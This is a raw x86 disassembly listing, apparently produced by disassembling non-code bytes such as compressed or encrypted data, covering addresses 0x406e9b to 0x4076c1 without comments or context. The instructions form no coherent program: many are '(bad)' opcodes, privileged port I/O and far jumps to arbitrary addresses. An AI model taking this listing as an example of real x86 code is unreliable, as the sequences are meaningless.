  406e9b:	stos   BYTE PTR es:[edi],al
  406e9c:	fs loop 0x406e3e
  406e9f:	sub    DWORD PTR [edx-0x41],ebx
  406ea2:	je     0x406eaf
  406ea4:	adc    cl,BYTE PTR [edx-0x40]
  406ea7:	fcom   DWORD PTR [eax]
  406ea9:	cli    
  406eaa:	js     0x406ee8
  406eac:	and    ch,BYTE PTR [edi]
  406eae:	in     eax,0x86
  406eb0:	xchg   DWORD PTR [eax-0x843b752],ebp
  406eb6:	dec    ebx
  406eb7:	xor    ecx,DWORD PTR [esi+ecx*4]
  406eba:	cmp    bh,BYTE PTR [ebp-0x6f]
  406ebd:	fmul   DWORD PTR ds:0x66b8ccc4
  406ec3:	mov    esi,0x6f7fec09
  406ec8:	jge    0x406e93
  406eca:	(bad)  
  406ecb:	jbe    0x406e70
  406ecd:	push   0xffffffc4
  406ecf:	add    DWORD PTR [eax-0x4d724fa6],0xffffff91
  406ed6:	cmp    DWORD PTR [edx-0x6f],esp
  406ed9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406eda:	xchg   BYTE PTR [edi],ah
  406edc:	mov    ch,0x38
  406ede:	fwait
  406edf:	ret    
  406ee0:	stos   DWORD PTR es:[edi],eax
  406ee1:	rcr    BYTE PTR [eax+0x74],0x4c
  406ee5:	ins    DWORD PTR es:[edi],dx
  406ee6:	xchg   ebp,eax
  406ee7:	retf   0x72e1
  406eea:	cmp    ah,BYTE PTR [edx+0x6e23cb1c]
  406ef0:	lods   al,BYTE PTR ds:[esi]
  406ef1:	push   eax
  406ef2:	mov    edi,0xa99a51cb
  406ef7:	adc    ah,bh
  406ef9:	sub    BYTE PTR [esi],bh
  406efb:	xchg   ebx,eax
  406efc:	mov    eax,ds:0xcff080e5
  406f01:	into   
  406f02:	adc    al,0x9
  406f04:	cmp    al,0x58
  406f06:	adc    dh,BYTE PTR [ecx-0x75cc66bd]
  406f0c:	pop    ebp
  406f0d:	cmp    al,0x8
  406f0f:	test   eax,0xfb0833a0
  406f14:	arpl   WORD PTR [eax+0x67],cx
  406f17:	xchg   ebp,eax
  406f18:	(bad)  
  406f19:	lds    ebx,FWORD PTR [edi-0x4cbeb363]
  406f1f:	adc    BYTE PTR [edx-0x3b2bca1b],0xe0
  406f26:	imul   eax,esp,0xf6fae16a
  406f2c:	lea    esi,[eax-0x2466f603]
  406f32:	push   ebp
  406f33:	mov    eax,ds:0x60b2f0b2
  406f38:	xor    al,0xd9
  406f3a:	test   eax,0x5abecaee
  406f3f:	out    0xb2,eax
  406f41:	retf   
  406f42:	call   0x2080:0xf352ddbf
  406f49:	(bad)  
  406f4b:	ror    DWORD PTR [ecx+0x5f1c8016],0xdb
  406f52:	out    0x5a,eax
  406f54:	bound  ebp,QWORD PTR [eax+0x6e3b20d5]
  406f5a:	imul   edi,DWORD PTR [ebx],0x7e
  406f5d:	jecxz  0x406ee6
  406f5f:	in     al,0x1d
  406f61:	jne    0x406fdd
  406f63:	clc    
  406f64:	aaa    
  406f65:	leave  
  406f66:	mov    edi,0x23d0f30d
  406f6b:	int    0x1b
  406f6d:	mov    ds:0x6e901e07,eax
  406f72:	jno    0x406f50
  406f74:	sbb    esp,DWORD PTR [ebx]
  406f76:	mov    ah,0xd2
  406f78:	and    eax,0x5cc3f5cd
  406f7d:	ds xchg edi,eax
  406f7f:	rcr    BYTE PTR [esp+ecx*1],0x93
  406f83:	idiv   esi
  406f85:	adc    DWORD PTR [esi-0x35b3f7c2],esi
  406f8b:	(bad)  
  406f8c:	inc    edi
  406f8d:	jmp    0xb8c3:0xd17fc965
  406f94:	jmp    0x406fee
  406f96:	jmp    0x406f44
  406f98:	and    al,0xfa
  406f9a:	or     DWORD PTR [edx+0xeaff107],ecx
  406fa0:	test   BYTE PTR [ebx+edx*8-0x14a7ce3e],0x6a
  406fa8:	inc    edi
  406fa9:	mov    dl,dh
  406fab:	mov    ah,0x17
  406fad:	pop    ecx
  406fae:	pop    ds
  406faf:	jb     0x406f8b
  406fb1:	enter  0x8edb,0x20
  406fb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fb6:	adc    ebx,DWORD PTR [edi]
  406fb8:	cld    
  406fb9:	mov    ?,WORD PTR [esi]
  406fbb:	cdq    
  406fbc:	in     eax,dx
  406fbd:	test   dh,0xc6
  406fc0:	lahf   
  406fc1:	push   edx
  406fc2:	jns    0x406fbe
  406fc4:	sub    eax,0x1579acae
  406fc9:	mov    esi,0x80f6566f
  406fce:	xchg   ebx,eax
  406fcf:	inc    esi
  406fd0:	cmp    edx,0x4cb170be
  406fd6:	es pop esp
  406fd8:	mov    bl,0xb9
  406fda:	aaa    
  406fdb:	jle    0x407046
  406fdd:	ss out 0x0,al
  406fe0:	sbb    edx,eax
  406fe2:	out    0xe1,al
  406fe4:	outs   dx,BYTE PTR ds:[esi]
  406fe5:	push   ecx
  406fe6:	cmc    
  406fe7:	jb     0x407058
  406fe9:	inc    ebx
  406fea:	(bad)  
  406feb:	adc    eax,0x83fa8f6e
  406ff0:	mov    ch,dl
  406ff2:	test   ch,0x4
  406ff5:	into   
  406ff6:	mov    edi,DWORD PTR [edx-0x3]
  406ff9:	dec    esp
  406ffa:	or     esi,DWORD PTR [edx-0x29412931]
  407000:	shl    DWORD PTR [esi+0x366f12f5],cl
  407006:	sub    eax,0x1a8b0094
  40700b:	dec    ebp
  40700c:	dec    ecx
  40700d:	jne    0x406fa4
  40700f:	or     BYTE PTR [ebx+0x75cd6300],bh
  407015:	aad    0xed
  407017:	xchg   ebx,eax
  407018:	add    dl,BYTE PTR [edx+0x2bfcdd97]
  40701e:	push   0x5b853bae
  407023:	pusha  
  407024:	jne    0x407096
  407026:	das    
  407027:	scas   al,BYTE PTR es:[edi]
  407028:	(bad)  
  407029:	scas   al,BYTE PTR es:[edi]
  40702a:	dec    edi
  40702b:	cmp    eax,0xf9d2be35
  407030:	adc    ah,BYTE PTR [edi+esi*8]
  407033:	lea    ebx,[edx]
  407035:	test   al,0xe
  407037:	mov    ah,0x59
  407039:	retf   0x166b
  40703c:	inc    ebp
  40703d:	sub    al,0xb0
  40703f:	mov    bl,0x36
  407041:	jp     0x407037
  407043:	mov    ah,0xf3
  407045:	outs   dx,BYTE PTR ds:[esi]
  407046:	add    BYTE PTR [edx+0x25],dh
  407049:	nop
  40704a:	mov    ds:0x2823f104,eax
  40704f:	mov    dh,0xf0
  407051:	pop    ss
  407052:	xchg   esi,eax
  407053:	test   DWORD PTR [edi+0x35],eax
  407056:	xor    bl,BYTE PTR [ecx]
  407058:	cmp    eax,0x15165955
  40705d:	test   al,0xb7
  40705f:	js     0x407032
  407061:	ds add bh,dl
  407064:	pushf  
  407065:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407066:	mov    al,0x44
  407068:	or     eax,0x1e1ac858
  40706d:	test   al,0x65
  40706f:	mov    dh,BYTE PTR [esi+0x39]
  407072:	mov    ebp,0xd7faa8e1
  407077:	jp     0x407064
  407079:	inc    edx
  40707a:	fidiv  DWORD PTR [esi+ebx*2-0x19]
  40707e:	add    bl,ch
  407080:	sub    al,0x7f
  407082:	mov    eax,0x75253bea
  407087:	neg    BYTE PTR [esi+0x4a]
  40708a:	push   ebp
  40708b:	dec    eax
  40708c:	xchg   ebp,eax
  40708d:	xchg   edx,eax
  40708e:	mov    ebx,0xd0e920e
  407093:	and    al,BYTE PTR [ebx]
  407095:	pop    es
  407096:	(bad)  
  407097:	jmp    0x9847:0xcf237bdb
  40709e:	sub    BYTE PTR [edi+0x4cd8b9f4],0xbb
  4070a5:	sub    DWORD PTR [eax-0x44bed20d],esi
  4070ab:	pop    edi
  4070ac:	push   edx
  4070ad:	pusha  
  4070ae:	pushf  
  4070af:	jl     0x407039
  4070b1:	test   DWORD PTR [ebp+esi*4+0x1d],0xa0d05214
  4070b9:	out    dx,eax
  4070ba:	aam    0x8
  4070bc:	ss mov ecx,0xf85f4702
  4070c2:	loopne 0x40710b
  4070c4:	daa    
  4070c5:	es fxch st(5)
  4070c8:	mov    ebp,fs
  4070ca:	add    al,0xc9
  4070cc:	xor    DWORD PTR fs:[ecx+0x24695131],eax
  4070d3:	sbb    eax,0x1e76609
  4070d8:	out    0xd8,eax
  4070da:	test   DWORD PTR [edx-0x29],eax
  4070dd:	jmp    0xeb91f802
  4070e2:	pushf  
  4070e3:	inc    ebp
  4070e4:	mov    cl,0x39
  4070e6:	add    eax,0x11383b03
  4070eb:	mov    dl,0xfc
  4070ed:	xlat   BYTE PTR ds:[ebx]
  4070ee:	neg    dh
  4070f0:	aam    0xba
  4070f2:	aad    0x1c
  4070f4:	aaa    
  4070f5:	sub    DWORD PTR [ebp+esi*2+0x25],ebp
  4070f9:	int    0xd4
  4070fb:	xchg   ecx,eax
  4070fc:	jae    0x407147
  4070fe:	addr16 xchg ebp,eax
  407100:	scas   al,BYTE PTR es:[edi]
  407101:	ret    0xcbb
  407104:	stc    
  407105:	and    eax,0xc30f98c8
  40710a:	mov    bh,0xd9
  40710c:	and    eax,0xb544a67
  407111:	jp     0x4070c3
  407113:	in     al,0x1a
  407115:	sbb    esp,DWORD PTR [edx]
  407117:	xlat   BYTE PTR ds:[ebx]
  407118:	ins    BYTE PTR es:[edi],dx
  407119:	dec    ebp
  40711a:	and    BYTE PTR [eax],dl
  40711c:	xor    eax,0x555f1b29
  407121:	cmp    al,0xf
  407123:	imul   esi,DWORD PTR ds:0x7acbea1d,0xc
  40712a:	ret    
  40712b:	dec    esi
  40712c:	lds    eax,FWORD PTR [edx+edx*4+0x6a]
  407130:	sbb    al,0xf7
  407132:	cmp    eax,0xac418ab5
  407137:	add    al,0x1f
  407139:	out    dx,al
  40713a:	loopne 0x407135
  40713c:	sbb    bh,0x98
  40713f:	jmp    0x7488:0x6ca41740
  407146:	xor    dl,dl
  407148:	in     al,0xb
  40714a:	push   ecx
  40714b:	jmp    0x95ede114
  407150:	sub    esi,ebp
  407152:	ret    
  407153:	aaa    
  407154:	(bad)  
  407155:	repz mov ds:0xb8cd47bb,eax
  40715b:	sub    DWORD PTR [edi-0x1a9b7abd],edx
  407161:	or     BYTE PTR [eax],al
  407163:	xchg   edx,eax
  407164:	aam    0xf1
  407166:	nop
  407167:	xchg   edi,eax
  407168:	bound  edx,QWORD PTR [eax]
  40716a:	pop    ecx
  40716b:	xchg   esp,eax
  40716c:	stos   BYTE PTR es:[edi],al
  40716d:	mov    eax,0x900004e7
  407172:	xor    BYTE PTR [edx-0x49],dh
  407175:	out    dx,eax
  407176:	loop   0x40718c
  407178:	jp     0x40717f
  40717a:	std    
  40717b:	and    DWORD PTR [edi-0x48],eax
  40717e:	jecxz  0x4071af
  407180:	fld    TBYTE PTR [edi]
  407182:	pop    ss
  407183:	call   0xd364:0x1fe0f6f1
  40718a:	sbb    bh,BYTE PTR [edi]
  40718c:	cmc    
  40718d:	sti    
  40718e:	adc    BYTE PTR [edx-0x7c],dh
  407191:	mov    al,0xd3
  407193:	out    0xe5,eax
  407195:	cmp    BYTE PTR [ecx+0x27],al
  407198:	lods   al,BYTE PTR ds:[esi]
  407199:	call   0x14cddaa4
  40719e:	popf   
  40719f:	imul   ecx,DWORD PTR [ecx-0x33],0x12
  4071a3:	data16 loope 0x407132
  4071a6:	ins    DWORD PTR es:[edi],dx
  4071a7:	ins    BYTE PTR es:[edi],dx
  4071a8:	jb     0x4071a1
  4071aa:	test   al,0x73
  4071ac:	dec    ebx
  4071ad:	sub    bl,BYTE PTR [esi-0x23]
  4071b0:	daa    
  4071b1:	or     al,0x1f
  4071b3:	idiv   BYTE PTR [eax-0x1da5a0a9]
  4071b9:	lods   eax,DWORD PTR ds:[esi]
  4071ba:	in     al,dx
  4071bb:	pop    es
  4071bc:	xor    bh,0x4f
  4071bf:	es in  eax,dx
  4071c1:	jp     0x40721a
  4071c3:	jg     0x407217
  4071c5:	xchg   ebx,eax
  4071c6:	xor    BYTE PTR [ebx-0x274afa8d],dl
  4071cc:	rcl    BYTE PTR [edx+edi*4+0x6cf49452],1
  4071d3:	sub    DWORD PTR ds:0x51399eb1,ecx
  4071d9:	aam    0x70
  4071db:	frstor [eax]
  4071dd:	add    ebx,ecx
  4071df:	add    BYTE PTR [edi-0x2845bd96],cl
  4071e5:	outs   dx,DWORD PTR ss:[esi]
  4071e7:	inc    esp
  4071e8:	test   BYTE PTR [esi+0x1f6bffa3],al
  4071ee:	sbb    bl,BYTE PTR es:[eax-0x73]
  4071f2:	jmp    DWORD PTR [esi+0x17]
  4071f5:	test   edx,ebp
  4071f7:	mov    cl,BYTE PTR [ebp+0x3f]
  4071fa:	popa   
  4071fb:	popa   
  4071fc:	pop    edx
  4071fd:	sbb    al,0x52
  4071ff:	imul   BYTE PTR [ecx]
  407201:	and    ebx,DWORD PTR [ecx]
  407203:	add    DWORD PTR [edx-0x8],eax
  407206:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407207:	lea    esp,[edi-0x22]
  40720a:	(bad)  
  40720b:	fisub  DWORD PTR [ecx-0x3ec51845]
  407211:	cmp    ebx,ebp
  407213:	test   al,0x55
  407215:	fild   WORD PTR [ebp+0x614f6b56]
  40721b:	xchg   BYTE PTR [ecx+0x1f],dh
  40721e:	imul   eax,DWORD PTR [edx],0x4e
  407221:	mov    eax,ds:0x9b48d287
  407226:	sub    BYTE PTR [edx-0x6fb77773],0x7c
  40722d:	nop
  40722e:	pop    esp
  40722f:	lock loop 0x407242
  407232:	xchg   edx,eax
  407233:	nop
  407234:	mov    eax,0x39a9c75e
  407239:	push   ebx
  40723a:	mov    edx,0x13f99e1e
  40723f:	mov    esi,0xc1e69165
  407244:	push   esp
  407245:	xor    eax,0x8fbed838
  40724a:	add    eax,0xeba602a7
  40724f:	mov    ebp,0xba89c8e6
  407254:	jl     0x4072c5
  407256:	into   
  407257:	fs es mov ebp,0x3f61a1a8
  40725e:	and    edi,DWORD PTR [esi+0x1e099f48]
  407264:	daa    
  407265:	into   
  407266:	xor    bh,BYTE PTR ds:0x513f63a1
  40726c:	fdiv   DWORD PTR [edx-0x269ea20]
  407272:	fidiv  WORD PTR [ecx-0x48]
  407275:	push   cs
  407276:	jns    0x4072b0
  407278:	xchg   edi,eax
  407279:	mov    WORD PTR [edi],?
  40727b:	inc    edx
  40727c:	bnd ret 
  40727e:	cmp    eax,DWORD PTR [ebx-0x32]
  407281:	mov    ebp,0xe5a2d4e8
  407286:	sub    ah,BYTE PTR [esi-0x23a3061d]
  40728c:	sti    
  40728d:	in     al,dx
  40728e:	xor    al,0x5c
  407290:	sahf   
  407291:	pop    esp
  407292:	inc    esi
  407293:	scas   al,BYTE PTR es:[edi]
  407294:	shl    esp,0xb2
  407297:	sbb    ecx,DWORD PTR [ebp-0x75]
  40729a:	fisttp DWORD PTR [edi-0x2c67855a]
  4072a0:	ins    BYTE PTR es:[edi],dx
  4072a1:	push   edi
  4072a2:	sbb    dh,BYTE PTR [edx-0x31]
  4072a5:	jmp    0x4072d5
  4072a7:	pop    esp
  4072a8:	sbb    BYTE PTR [eax+0x29209c51],0xd7
  4072af:	inc    esp
  4072b0:	cmp    DWORD PTR [esi-0x272e2735],0xffffffcc
  4072b7:	retf   
  4072b8:	jne    0x407302
  4072ba:	repnz xchg esi,eax
  4072bc:	or     eax,0xc50b1625
  4072c1:	push   esp
  4072c2:	add    ecx,ebx
  4072c4:	mov    al,ds:0xeff4a7fd
  4072c9:	cwde   
  4072ca:	cmp    BYTE PTR [edi+0x63],dh
  4072cd:	loope  0x4072e4
  4072cf:	dec    esp
  4072d0:	add    eax,0x3ec596b2
  4072d5:	bound  eax,QWORD PTR [edx]
  4072d7:	ror    ebx,1
  4072d9:	sub    ecx,DWORD PTR [edi]
  4072db:	mov    ds:0xf614d1cf,eax
  4072e0:	ret    0xbb6f
  4072e3:	inc    DWORD PTR [esi-0x56fad1b5]
  4072e9:	cwde   
  4072ea:	outs   dx,DWORD PTR ds:[esi]
  4072eb:	pop    ebp
  4072ec:	xor    ecx,DWORD PTR [edx+eiz*4]
  4072ef:	(bad)  
  4072f0:	aad    0xa3
  4072f2:	imul   ebx,DWORD PTR [edi-0x29],0xa929ee6c
  4072f9:	dec    edi
  4072fa:	jne    0x4072d3
  4072fc:	pop    ebx
  4072fd:	pop    ecx
  4072fe:	sbb    eax,0xd395a417
  407303:	adc    ebx,DWORD PTR [ebp-0x3e]
  407306:	cs push 0x7
  407309:	aas    
  40730a:	stc    
  40730b:	push   0xffffffd0
  40730d:	mov    ch,0x8
  40730f:	imul   ebp,DWORD PTR [eax+0x24],0x6f
  407313:	xchg   esi,eax
  407314:	cwde   
  407315:	mov    ebp,0x14cf774a
  40731a:	imul   ebp,ebp,0xb74148b3
  407320:	sub    bh,dh
  407322:	(bad)  [ebp+0x62671b50]
  407328:	fwait
  407329:	inc    ebx
  40732a:	push   ecx
  40732b:	xor    dh,0x98
  40732e:	mov    al,ds:0x6539c532
  407333:	mov    al,ds:0x77f987a
  407338:	add    BYTE PTR [ebp-0x521d58b5],0x22
  40733f:	or     BYTE PTR [edx+ebp*1+0x7],bh
  407343:	push   ss
  407344:	or     al,0xc
  407346:	xor    eax,0xe47abf97
  40734b:	xor    ah,BYTE PTR [eax]
  40734d:	int3   
  40734e:	enter  0xa37d,0xaa
  407352:	in     eax,0x23
  407354:	shl    DWORD PTR ds:0x29cef16d,cl
  40735a:	les    ebp,FWORD PTR [edx]
  40735c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40735d:	inc    edx
  40735e:	xchg   ebp,eax
  40735f:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  407361:	imul   ebp,DWORD PTR [ebp-0x5e371abe],0x21a7c58d
  40736b:	ins    DWORD PTR es:[edi],dx
  40736c:	jl     0x40731b
  40736e:	jecxz  0x4073e3
  407370:	add    BYTE PTR fs:[ecx-0x83e0b3b],cl
  407377:	sub    bh,al
  407379:	mov    al,0x2c
  40737b:	xchg   ebp,eax
  40737c:	mov    ch,0xe1
  40737f:	js     0x40733c
  407381:	push   esp
  407382:	hlt    
  407383:	jns    0x407365
  407385:	pop    ebp
  407386:	jae    0x4073ce
  407388:	loop   0x407356
  40738a:	(bad)  
  40738b:	test   al,0x60
  40738d:	ins    DWORD PTR es:[edi],dx
  40738e:	cli    
  40738f:	in     al,dx
  407390:	iret   
  407391:	rcl    DWORD PTR [ecx+edx*1],cl
  407394:	cmp    eax,0x5214a631
  407399:	jecxz  0x407406
  40739b:	loope  0x40733d
  40739d:	or     dl,BYTE PTR cs:[eax]
  4073a0:	loop   0x40733a
  4073a2:	(bad)  
  4073a3:	mov    ecx,0xb9a227f3
  4073a8:	sbb    DWORD PTR [eax],0x4292d58f
  4073ae:	mov    al,0xf8
  4073b0:	xchg   DWORD PTR [edx],ebx
  4073b2:	ss sbb al,0xa9
  4073b5:	adc    edx,DWORD PTR [ecx+0x57cfd5b2]
  4073bb:	dec    edx
  4073bc:	mov    ebp,DWORD PTR [ecx+0x26876d20]
  4073c2:	outs   dx,BYTE PTR ds:[esi]
  4073c3:	jge    0x407429
  4073c5:	xchg   edx,eax
  4073c6:	lahf   
  4073c7:	push   ss
  4073c8:	stos   DWORD PTR es:[edi],eax
  4073c9:	addr16 cmp al,0x79
  4073cc:	lds    eax,FWORD PTR [esi-0x39]
  4073cf:	push   esi
  4073d0:	sbb    BYTE PTR [edx],dh
  4073d2:	push   esi
  4073d3:	dec    eax
  4073d4:	retf   
  4073d5:	dec    edi
  4073d6:	nop
  4073d7:	jno    0x407413
  4073d9:	test   eax,0x947742c7
  4073de:	sub    eax,esi
  4073e0:	dec    ebp
  4073e1:	into   
  4073e2:	and    BYTE PTR [edx+0x6d],al
  4073e5:	(bad)  
  4073e7:	test   BYTE PTR ds:[esp+ebx*4],dl
  4073eb:	push   es
  4073ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073ee:	pop    esi
  4073ef:	mov    esi,0x77ce6c5e
  4073f4:	mov    ch,0x64
  4073f6:	and    ebp,DWORD PTR [ecx+edi*2+0x5e]
  4073fa:	xchg   ecx,ebp
  4073fc:	test   DWORD PTR [edx],ebp
  4073fe:	dec    esi
  4073ff:	mov    dl,0x3d
  407401:	dec    edi
  407402:	sbb    al,0xd
  407404:	pop    ebx
  407405:	mov    esp,edi
  407407:	push   ds
  407408:	out    0x40,eax
  40740a:	arpl   dx,cx
  40740c:	icebp  
  40740d:	daa    
  40740e:	mov    edx,0x458cf6bf
  407413:	repnz fcomp st(1)
  407416:	jmp    0xf004:0x62f8e88a
  40741d:	call   0x5aa0:0xd98d97ad
  407424:	or     BYTE PTR [ebp+eax*2+0x41],0xf1
  407429:	or     BYTE PTR [edi-0x26be2299],0x88
  407430:	xor    DWORD PTR [ebp+edx*1+0x6be0a3ba],edx
  407437:	leave  
  407438:	ret    0xee15
  40743b:	ret    0x5270
  40743e:	adc    al,ah
  407440:	(bad)  
  407441:	mov    ss,WORD PTR [ebp+0x34]
  407444:	outs   dx,BYTE PTR ds:[esi]
  407445:	scas   al,BYTE PTR es:[edi]
  407446:	jge    0x4073eb
  407448:	sahf   
  407449:	xchg   sp,ax
  40744b:	and    ebp,DWORD PTR [eax]
  40744d:	jl     0x40749a
  40744f:	adc    ah,BYTE PTR [edx+0x3]
  407452:	dec    esp
  407453:	mov    eax,0x9988a14f
  407458:	jp     0x40742c
  40745a:	push   esp
  40745b:	fcom   DWORD PTR [edx+ebx*8+0x1e]
  40745f:	leave  
  407460:	push   esp
  407461:	dec    edx
  407462:	test   eax,0x1dbc65c
  407467:	lea    ebx,[ebx+0x15]
  40746a:	stc    
  40746b:	lods   eax,DWORD PTR ds:[esi]
  40746c:	jae    0x407487
  40746e:	ret    0xbd65
  407471:	push   ds
  407472:	push   ss
  407473:	jns    0x4074a0
  407475:	inc    ebx
  407476:	dec    ecx
  407477:	outs   dx,BYTE PTR ds:[esi]
  407478:	bound  ebx,QWORD PTR [esi]
  40747a:	ret    
  40747b:	xor    al,0xee
  40747d:	add    cl,BYTE PTR [eax+0x6c]
  407480:	icebp  
  407481:	or     eax,0xcdffd805
  407486:	int    0x13
  407488:	cs aas 
  40748a:	xchg   ebx,eax
  40748b:	mov    ecx,DWORD PTR ds:0x334f9a77
  407491:	popa   
  407492:	sub    al,0x94
  407494:	sbb    DWORD PTR ds:0xf3f3d934,esp
  40749a:	xor    eax,0xa7819e54
  40749f:	mov    ebp,0x4298978b
  4074a4:	fisub  DWORD PTR [edx+0x4a400888]
  4074aa:	sub    eax,0x2dac9c55
  4074af:	jb     0x407449
  4074b1:	cmp    eax,0xb1438494
  4074b6:	mov    ebx,gs
  4074b8:	enter  0xa251,0x9e
  4074bc:	loop   0x407451
  4074be:	(bad)  [eax-0x6038cacf]
  4074c4:	je     0x4074c9
  4074c6:	xchg   ax,ax
  4074c8:	xor    ch,BYTE PTR [eax-0x7a]
  4074cb:	sbb    ah,BYTE PTR [ebp+0x38724105]
  4074d1:	add    bl,BYTE PTR [eax-0x53a19087]
  4074d7:	jae    0x4074e8
  4074d9:	push   es
  4074da:	aaa    
  4074db:	mov    ecx,0xd1774cc5
  4074e0:	jmp    0x4074eb
  4074e2:	pop    edi
  4074e3:	xor    eax,0x712b2c64
  4074e8:	jb     0x40755f
  4074ea:	in     al,0x32
  4074ec:	dec    ebx
  4074ed:	aas    
  4074ee:	mov    DWORD PTR [ebx+edi*8],ecx
  4074f1:	aam    0x77
  4074f3:	add    al,dh
  4074f5:	lea    esi,[eax-0x7261695d]
  4074fb:	push   ss
  4074fc:	inc    esp
  4074fd:	or     eax,DWORD PTR [eax]
  4074ff:	int    0x5e
  407501:	mov    esi,DWORD PTR [ebx+0x2784a1ef]
  407507:	enter  0x8df,0x2a
  40750b:	cmp    DWORD PTR [esi+0x56],edx
  40750e:	data16 add BYTE PTR [esi],0x79
  407512:	lea    edi,[eax+ecx*4+0x692436d]
  407519:	icebp  
  40751a:	jo     0x4074ce
  40751c:	xchg   ebx,eax
  40751d:	lahf   
  40751e:	xchg   ecx,eax
  40751f:	fdivr  DWORD PTR ds:0xfa79ce81
  407525:	repnz push es
  407527:	mov    al,0x32
  407529:	mov    ds:0xe717707a,al
  40752e:	pop    ebx
  40752f:	adc    BYTE PTR [esi+0x6ad56487],ch
  407535:	xor    eax,0x8fe45482
  40753a:	xor    al,0xe4
  40753c:	add    eax,0x30268750
  407541:	into   
  407542:	lock mov cl,0x15
  407545:	out    dx,al
  407546:	sub    eax,0x815a22c2
  40754b:	xor    edi,eax
  40754d:	scas   eax,DWORD PTR es:[edi]
  40754e:	inc    ebp
  40754f:	jo     0x4074f6
  407551:	mov    ebp,0x1a02f60b
  407556:	adc    BYTE PTR [edi+0x5784d887],dl
  40755c:	jb     0x4075c3
  40755e:	xchg   esi,eax
  40755f:	add    DWORD PTR [eax],ebp
  407561:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407562:	scas   al,BYTE PTR es:[edi]
  407563:	test   ebx,0x508e740a
  407569:	ds and eax,0xc7186071
  40756f:	ficom  WORD PTR [ebx-0x6]
  407572:	retf   0xf559
  407575:	add    BYTE PTR [edi+0x19991109],ch
  40757b:	or     al,0x50
  40757d:	mov    fs,WORD PTR [edx+edi*2+0x64]
  407581:	sbb    ebx,ecx
  407583:	popa   
  407584:	and    bl,bl
  407586:	xchg   ecx,eax
  407587:	mov    eax,0x2f53d20
  40758c:	ror    ecx,1
  40758e:	icebp  
  40758f:	ja     0x40760e
  407591:	xor    eax,0x270569cf
  407596:	rcr    DWORD PTR [edi],1
  407598:	clc    
  407599:	in     al,0xa2
  40759b:	stc    
  40759c:	lods   al,BYTE PTR ds:[esi]
  40759d:	mov    ebp,0x836853d
  4075a2:	jmp    FWORD PTR ds:0x89ce0d9d
  4075a8:	sbb    DWORD PTR [ebp+0x473c5b5d],ebx
  4075ae:	inc    edi
  4075af:	imul   edi,DWORD PTR [esi-0xa],0x4a
  4075b3:	in     al,dx
  4075b4:	pusha  
  4075b5:	loopne 0x407551
  4075b7:	rcl    DWORD PTR [edi],cl
  4075b9:	pop    ss
  4075ba:	sar    BYTE PTR ds:0x81d38d12,0x30
  4075c1:	xor    eax,0xc3538a00
  4075c6:	fwait
  4075c7:	dec    esp
  4075c8:	test   al,0x5b
  4075ca:	mov    ah,0x3f
  4075cc:	adc    al,0xfb
  4075ce:	jl     0x4075f3
  4075d0:	mov    bh,0xe7
  4075d2:	and    BYTE PTR ds:0x95f70143,al
  4075d8:	dec    esp
  4075d9:	mov    dl,0xdd
  4075db:	or     DWORD PTR [edx-0x709a8ee7],edi
  4075e1:	xchg   edi,esp
  4075e3:	dec    esi
  4075e4:	aad    0x93
  4075e6:	xchg   ecx,eax
  4075e7:	mov    ebp,0x9549b1df
  4075ec:	sub    BYTE PTR [edx-0x2497566d],ah
  4075f2:	mov    ecx,0x1404778e
  4075f7:	icebp  
  4075f8:	das    
  4075f9:	or     al,0x44
  4075fb:	das    
  4075fc:	add    DWORD PTR [edx+edi*4+0x337f1998],ebp
  407603:	mov    edi,0xc07a9825
  407608:	mov    ecx,0x7083f6b
  40760d:	mov    esi,0x82b305c2
  407612:	and    cl,BYTE PTR [edi+0x5394d0f8]
  407618:	ins    BYTE PTR es:[edi],dx
  407619:	mov    ch,0x2f
  40761b:	sbb    esp,DWORD PTR [edi]
  40761d:	or     ah,dh
  40761f:	push   ebp
  407620:	popa   
  407621:	out    dx,eax
  407622:	not    dl
  407624:	and    DWORD PTR [ecx-0x4c],ebp
  407627:	mov    BYTE PTR [edi-0x6206be4f],0xae
  40762e:	test   esp,edx
  407630:	into   
  407631:	adc    ah,BYTE PTR [ebx+eax*2+0x5e]
  407635:	jns    0x407694
  407637:	shr    BYTE PTR [edi],1
  407639:	jmp    0x64403614
  40763e:	inc    ebx
  40763f:	mov    ch,0x14
  407641:	inc    eax
  407642:	out    dx,al
  407643:	pop    edx
  407644:	pop    eax
  407645:	aam    0x7a
  407647:	outs   dx,BYTE PTR ds:[esi]
  407648:	test   al,bl
  40764a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40764b:	fdivr  DWORD PTR [esi+ebx*4-0x3c19fa5c]
  407652:	mov    BYTE PTR [esi-0x5b2be35],dh
  407658:	arpl   dx,dx
  40765a:	in     al,dx
  40765b:	mov    ebp,0xc969d900
  407660:	jl     0x40761c
  407662:	and    eax,0xac0d3609
  407667:	jo     0x4076da
  407669:	and    eax,0xe9fa3bd9
  40766f:	dec    edx
  407670:	popa   
  407671:	aas    
  407672:	fisub  DWORD PTR [ebp+0x3c]
  407675:	sbb    DWORD PTR [ecx],esi
  407677:	mov    BYTE PTR [edx+ecx*1-0x6241a7f2],bh
  40767e:	(bad)  
  40767f:	lock pop esp
  407681:	imul   ebx,DWORD PTR [ebp+0x34],0x25fadbba
  407688:	sub    eax,0x27d0237f
  40768d:	das    
  40768e:	fst    QWORD PTR [ebx+0x247e3b18]
  407694:	aaa    
  407695:	sbb    eax,DWORD PTR cs:[ecx]
  407698:	sbb    al,0x40
  40769a:	aas    
  40769b:	or     BYTE PTR [eax-0x6cde6ed2],0x1a
  4076a2:	popf   
  4076a3:	lods   al,BYTE PTR ds:[esi]
  4076a4:	loop   0x40763b
  4076a6:	sbb    ch,ah
  4076a8:	jo     0x4076a8
  4076aa:	mov    ds:0xa0ff84a9,eax
  4076af:	or     BYTE PTR [ebp+ebp*1-0x6],bh
  4076b3:	push   ebp
  4076b4:	popf   
  4076b5:	sbb    eax,0xcf0be7dd
  4076ba:	and    eax,0xc023c8be
  4076bf:	loope  0x4076cf
  4076c1:	test   al,0x85
